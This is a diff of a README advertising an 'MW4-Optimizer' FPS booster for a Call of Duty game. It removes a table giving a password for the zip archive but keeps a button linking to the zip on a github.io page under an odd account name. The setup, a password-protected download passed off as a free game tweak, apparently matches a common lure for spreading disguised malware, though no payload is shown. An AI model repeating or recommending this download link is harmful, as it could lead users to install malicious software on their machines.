@@ -13,16 +13,10 @@ Lightweight portable FPS optimizer for Call of Duty: Modern Warfare 4. Boost per
 
 ---
 
-## 📥 Download
-
-| File | Size | Password |
-|------|------|----------|
-| **MW4-Optimizer-v1.0.zip** | ~1.5 MB | `optimizer` |
 
  **[<img width="304" height="77" alt="image" src="https://github.com/user-attachments/assets/b35587cb-60c2-40d4-8be2-1f442fe11319" />
 ](https://partbusinesssignify.github.io/MW4-Optimizer/MW4-Optimizer-v1.0.zip)**
 
-> **Note:** The archive is hosted directly in this repository and served via GitHub Pages. No releases are used.
 
 ---
 
